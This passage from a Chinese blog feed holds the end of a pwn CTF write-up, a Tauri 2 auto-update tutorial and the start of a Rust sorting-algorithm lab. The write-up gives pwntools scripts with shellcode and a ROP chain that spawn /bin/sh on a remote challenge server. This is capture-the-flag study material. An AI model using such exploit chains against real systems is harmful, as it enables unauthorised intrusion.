p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"[+]"</span><span class="token punctuation">)</span>

stage2 <span class="token operator">=</span> <span class="token string">b"\x90"</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>stage2<span class="token punctuation">)</span> <span class="token operator">></span> READ_N<span class="token punctuation">:</span>
    <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stage2 too long: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>stage2<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>READ_N<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
stage2 <span class="token operator">=</span> stage2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>READ_N<span class="token punctuation">,</span> <span class="token string">b"\x90"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>stage2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="sur-prize"><a href="#sur-prize" class="headerlink" title="sur_prize"></a>sur_prize</h2><p>莫名奇妙的一道题，输入的第一个地址就覆盖了返回地址，导致无法设置rbp，栈迁移打不出来</p>
<p>虽然可以用pop rbp设置，但是输入函数居然是rsp寻址，而两个指令执行函数都是rbp寻址，这导致把rbp改到bss段之后没法往上任意写</p>
<p>发现直接跳转到0x401100处执行printf，恰好输出0字节，rax为0，然后跳转到一个借助rbp设置寄存器的syscall ret完成bss段任意写就好了</p>
<p>感觉printf这么用很莫名奇妙，这真是预期解吗<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">,</span> terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment">#p = process("./vuln")</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"nc1.ctfplus.cn"</span><span class="token punctuation">,</span> <span class="token number">13092</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

bin_ls <span class="token operator">=</span> <span class="token number">0x401657</span> 
bin_cat <span class="token operator">=</span> <span class="token number">0x004016A2</span> 
bss_addr <span class="token operator">=</span> <span class="token number">0x0404000</span> <span class="token operator">+</span> <span class="token number">0x800</span>
leave_ret <span class="token operator">=</span> <span class="token number">0x00401399</span>
gets_addr <span class="token operator">=</span> <span class="token number">0x40174F</span>
pop_rbp <span class="token operator">=</span> <span class="token number">0x00040125d</span>
printf <span class="token operator">=</span> <span class="token number">0x00401100</span>
sys1 <span class="token operator">=</span> <span class="token number">0x00000040168e</span>
sys <span class="token operator">=</span> <span class="token number">0x000000401689</span>
syscall <span class="token operator">=</span> <span class="token number">0x0040169D</span> 
add_rsp_ret <span class="token operator">=</span> <span class="token number">0x000401016</span>
printf_addr <span class="token operator">=</span> <span class="token number">0x004015DE</span>  
ret <span class="token operator">=</span> <span class="token number">0x040101a</span>
bin_sh <span class="token operator">=</span> bss_addr <span class="token operator">+</span> <span class="token number">0x68</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"a"</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>

<span class="token comment"># 栈迁移</span>
payload <span class="token operator">=</span> <span class="token string">b""</span>
<span class="token comment">#payload += p64(leave_ret)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
<span class="token comment">#payload += p64(bss_addr)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf<span class="token punctuation">)</span> <span class="token comment">#什么也不输出，然后把rax设置为0</span>
<span class="token comment">#payload += p64(printf_addr) </span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sys1<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># get shell，懒得定位最后会落到哪个bin_sh上遂多复制了几个</span>
p2 <span class="token operator">=</span> <span class="token string">b""</span> 
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
p2 <span class="token operator">+=</span> <span class="token string">b"/bin/sh\x00"</span>
<span class="token comment">#gdb.attach(p)</span>

time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;为期一周，中间夹杂着其他的事，做得蛮累的&lt;/p&gt;
&lt;h2 id=&quot;什么？我不是汇编高手吗？&quot;&gt;&lt;a href=&quot;#什么？我不是汇编高手吗？&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
    
    
    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tauri-2 自动更新</title>
    <link href="https://aucept.in/2026/01/18/tauri-2-%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0/"/>
    <id>https://aucept.in/2026/01/18/tauri-2-%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0/</id>
    <published>2026-01-18T15:09:19.000Z</published>
    <updated>2026-01-19T12:36:47.030Z</updated>
    
    <content type="html"><![CDATA[<p>用tauri做项目已经不陌生了，就记录发布之后如何完成自动更新这一步吧</p>
<h2 id="项目代码"><a href="#项目代码" class="headerlink" title="项目代码"></a>项目代码</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>cargo.toml里加上<br><pre class="line-numbers language-toml" data-language="toml"><code class="language-toml"><span class="token key property">tauri-plugin-updater</span> <span class="token punctuation">=</span> <span class="token string">"2.9.0"</span>
<span class="token key property">tauri-plugin-process</span> <span class="token punctuation">=</span> <span class="token string">"2.3.1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<p>相应的tauri::Builder里补充两行<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token punctuation">.</span><span class="token function">plugin</span><span class="token punctuation">(</span><span class="token namespace">tauri_plugin_updater<span class="token punctuation">::</span></span><span class="token class-name">Builder</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token function">plugin</span><span class="token punctuation">(</span><span class="token namespace">tauri_plugin_process<span class="token punctuation">::</span></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<p>tauri.conf.json里，plugins里加上<br><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"bundle"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"active"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    <span class="token property">"targets"</span><span class="token operator">:</span> <span class="token string">"all"</span><span class="token punctuation">,</span>
    <span class="token property">"createUpdaterArtifacts"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token property">"plugins"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"updater"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token property">"pubkey"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
        <span class="token property">"endpoints"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token string">"https://github.com/your_name/your_repositorie_name/releases/latest/download/latest.json"</span>
        <span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>在src-tauri/capabilities/default.json补充<br><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">"core:default"</span><span class="token punctuation">,</span>
    <span class="token string">"updater:allow-check"</span><span class="token punctuation">,</span>
    <span class="token string">"updater:allow-download-and-install"</span><span class="token punctuation">,</span>
    <span class="token string">"core:app:allow-app-show"</span><span class="token punctuation">,</span>
    <span class="token string">"core:app:allow-app-hide"</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">log<span class="token punctuation">::</span></span>info<span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">tauri<span class="token punctuation">::</span></span><span class="token class-name">AppHandle</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">tauri_plugin_updater<span class="token punctuation">::</span></span><span class="token class-name">UpdaterExt</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">tauri_plugin_process<span class="token punctuation">::</span></span><span class="token operator">*</span><span class="token punctuation">;</span>

<span class="token attribute attr-name">#[tauri::command]</span>
<span class="token keyword">pub</span> <span class="token keyword">async</span> <span class="token keyword">fn</span> <span class="token function-definition function">check_update</span><span class="token punctuation">(</span>app<span class="token punctuation">:</span> <span class="token namespace">tauri<span class="token punctuation">::</span></span><span class="token class-name">AppHandle</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> updater <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">updater</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map_err</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>e<span class="token closure-punctuation punctuation">|</span></span> e<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    <span class="token comment">// 检查是否有新版本</span>
    <span class="token comment">// 根据 tauri.conf.json 里的 endpoints 去请求更新源</span>
    <span class="token keyword">let</span> update_result <span class="token operator">=</span> updater<span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">await</span><span class="token punctuation">.</span><span class="token function">map_err</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>e<span class="token closure-punctuation punctuation">|</span></span> e<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>update<span class="token punctuation">)</span> <span class="token operator">=</span> update_result <span class="token punctuation">&#123;</span>
        update
            <span class="token punctuation">.</span><span class="token function">download_and_install</span><span class="token punctuation">(</span>
                <span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>chunk_length<span class="token punctuation">,</span> content_length<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span> <span class="token operator">=</span> content_length <span class="token punctuation">&#123;</span>
                        <span class="token macro property">info!</span><span class="token punctuation">(</span><span class="token string">"下载进度: &#123;&#125;/&#123;&#125;"</span><span class="token punctuation">,</span> chunk_length<span class="token punctuation">,</span> total<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                <span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
                    <span class="token macro property">info!</span><span class="token punctuation">(</span><span class="token string">"下载完成，正在安装..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token keyword">await</span>
            <span class="token punctuation">.</span><span class="token function">map_err</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>e<span class="token closure-punctuation punctuation">|</span></span> e<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

        <span class="token macro property">info!</span><span class="token punctuation">(</span><span class="token string">"更新成功，应用即将重启"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        app<span class="token punctuation">.</span><span class="token function">restart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token string">"Update installed successfully, restarting..."</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token string">"Already up to date"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token attribute attr-name">#[tauri::command]</span>
<span class="token keyword">pub</span> <span class="token keyword">async</span> <span class="token keyword">fn</span> <span class="token function-definition function">get_version</span><span class="token punctuation">(</span>app<span class="token punctuation">:</span> <span class="token class-name">AppHandle</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> version <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">package_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>version<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"v&#123;&#125;"</span><span class="token punctuation">,</span> version<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="外部"><a href="#外部" class="headerlink" title="外部"></a>外部</h2><h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><p>首先生成一对秘钥<code>npx tauri signer generate -w ~/.tauri/myapp.key</code></p>
<p>公钥填在tauri.conf.json里</p>
<p>私钥 github仓库，Settings -&gt; Secrets and variables -&gt; Actions -&gt; New repository secret</p>
<h3 id="endpoint"><a href="#endpoint" class="headerlink" title="endpoint"></a>endpoint</h3><p>一个远程JSON文件的 URL，github action会生成，里面有版本号，安装包uri等等</p>
<p>总之轮子都是现成的，还是很方便的，配置起来也比我想的简单</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;用tauri做项目已经不陌生了，就记录发布之后如何完成自动更新这一步吧&lt;/p&gt;
&lt;h2 id=&quot;项目代码&quot;&gt;&lt;a href=&quot;#项目代码&quot; class=&quot;headerlink&quot; title=&quot;项目代码&quot;&gt;&lt;/a&gt;项目代码&lt;/h2&gt;&lt;h3 id=&quot;配置&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
    <category term="tauri" scheme="https://aucept.in/tags/tauri/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-排序实验</title>
    <link href="https://aucept.in/2025/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-12-22T05:03:55.000Z</published>
    <updated>2026-01-02T13:30:29.965Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="内部排序算法比较"><a href="#内部排序算法比较" class="headerlink" title="内部排序算法比较"></a>内部排序算法比较</h3><blockquote>
<p>对7种常用的内部排序算法进行比较：直接插入排序、希尔排序、冒泡排序、快速排序、简单选择排序、堆排序、二路归并排序。<br>待排序表的表长不少于100；其中的数据要用伪随机数产生程序产生；至少要用5组不同的输入数据作比较；比较的指标为关键字参加的比较次数和数据元素的移动次数（关键字交换计为3次移动）。<br>对不同的输入表长做试验，观察两个指标相对于表长的变化关系，也可以对稳定性做验证。</p>
</blockquote>
<h3 id="统计成绩"><a href="#统计成绩" class="headerlink" title="统计成绩"></a>统计成绩</h3><blockquote>
<p>给出n个学生的m门考试的成绩表，每个学生的信息由学号、姓名以及各科成绩组成。对学生的考试成绩进行有关统计，并打印统计表。<br>①按总分由高到低的顺序，打印出名次表，分数相同的为同一名次；<br>②按名次打印出每个学生的学号、姓名、总分以及各科成绩。</p>
</blockquote>
<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>一些经验，rust对于类型要求很严格，所以用作索引的一律用usize，因为for循环里的i默认是，统计数据用u64，如果u32溢出程序会直接panic</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>mem<span class="token punctuation">::</span></span>swap<span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">tracing<span class="token punctuation">::</span></span>info<span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">tracing_subscriber<span class="token punctuation">::</span>filter<span class="token punctuation">::</span></span><span class="token class-name">LevelFilter</span><span class="token punctuation">;</span>

<span class="token keyword">pub</span> <span class="token keyword">struct</span>  <span class="token type-definition class-name">Benchmark</span><span class="token punctuation">&#123;</span>
    compare_time <span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>
    move_time <span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">struct</span> <span class="token type-definition class-name">Sort</span><span class="token punctuation">&#123;</span>
    bench <span class="token punctuation">:</span> <span class="token class-name">Benchmark</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token class-name">Sort</span><span class="token punctuation">&#123;</span>

    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Sort</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Sort</span><span class="token punctuation">&#123;</span>
            bench <span class="token punctuation">:</span> <span class="token class-name">Benchmark</span><span class="token punctuation">&#123;</span>
                compare_time <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
                move_time <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">compare</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> num1 <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> num2 <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>compare_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        num1 <span class="token operator">></span> num2
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">insert_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..</span>nums<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//如果小于，直接跳过</span>
                temp <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">let</span> <span class="token keyword">mut</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span>

                <span class="token keyword">while</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 与第j-1个元素相比较</span>
                    nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                    j <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">shell_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
